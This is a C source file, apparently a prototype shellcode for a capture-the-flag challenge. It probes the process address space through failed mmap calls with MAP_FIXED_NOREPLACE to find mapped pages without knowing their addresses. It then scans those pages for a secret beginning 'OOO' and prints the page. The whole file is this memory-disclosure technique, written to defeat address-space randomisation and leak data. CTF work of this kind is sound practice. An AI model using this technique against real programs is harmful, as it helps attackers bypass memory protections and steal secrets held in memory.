#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL

#define MAX_MAP_SIZE 0x4000000UL

typedef struct range_e 
{
    void* addr;
    unsigned long range;
} range_t;

void* found_pages[100];
int found_size=0;


range_t ghetto_stack[100000];
int stack_size;

void push(range_t elem)
{
    ghetto_stack[stack_size++] = elem;
    if(stack_size >= 100000) 
    {
        printf("fuck");
        exit(4);
    }
}
range_t pop()
{
    return ghetto_stack[--stack_size];
}

// gotta do this without function calls
void search(range_t range)
{
    push(range);
    while(stack_size > 0)
    {
        range_t current = pop();

        //printf("stack size: %d, calling search with addr, range: (%p, %p)\n", stack_size, current.addr, current.range);
        if((unsigned long)current.addr & 0xfff) exit(3);
        void* ret = mmap(current.addr, current.range, PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE , -1, 0);
        if(ret != (void*) -1)
        {
            munmap(current.addr, current.range);
            // the map succeded, so nothing here
            continue;
        }
        else
        {
            if(current.range == 4096)
            {
                // found a hit
                //printf("found mapped page %p with errno %d\n", range.addr, errno);
                found_pages[found_size++] = current.addr;
                continue;
            }
            else 
            {
                range_t left_range = {current.addr, current.range/2};
                range_t right_range = {current.addr + current.range/2, current.range/2};
                push(left_range);
                push(right_range);
                continue;
            }
        }
    }
}
/*
void search(range_t range)
{
    //printf("calling search with addr, range: (%p, %p)\n", range.addr, range.range);

    if((unsigned long)range.addr & 0xfff) exit(3);

    //errno = 0;
    void* ret = mmap(range.addr, range.range, PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE , -1, 0);

    //if(errno)printf("got errno %d with addr, range: (%p, %p)\n",errno, range.addr, range.range);

    if(ret != (void*) -1)
    {
        munmap(range.addr, range.range);
        return;
        // the map succeded, so nothing here
    }
    else
    {
        if(range.range == 4096)
        {
            // found a hit
            //printf("found mapped page %p with errno %d\n", range.addr, errno);
            found_pages[size++] = range.addr;
            return;
        }
        else 
        {
            range_t left_range = {range.addr, range.range/2};
            range_t right_range = {range.addr + range.range/2, range.range/2};
            search(left_range);
            search(right_range);
            return;
        }
    }

fin:
return;

}
*/

void *shellcode()
{
    // 1. Find the secret in memory (starts with "OOO:")
    // 2. Print it
    // 3. ...
    // 4. PROFIT!

    printf("Hi! Soon I'll be your shellcode!\n");
    for(long i=0; i<2 * ADDR_MIN / MAX_MAP_SIZE; i++){
        range_t range = {.addr=(void*)(ADDR_MIN + i*MAX_MAP_SIZE), .range=MAX_MAP_SIZE};
        search(range);
    }
    printf("found %d pages\n", found_size);
    for(int i=0; i<found_size; i++)
    {
        printf("testing page %p\n", found_pages[i]);
        char* page_ptr = (char*) found_pages[i];
        if( page_ptr[0] == 'O' && 
        page_ptr[1] == 'O' && 
        page_ptr[2] == 'O')
        {
            write(1, found_pages[i], 4096);
            return found_pages[i];
        }
    }

    return (void*) 0x123456; // For this simplified test it's also OK to return the address
}
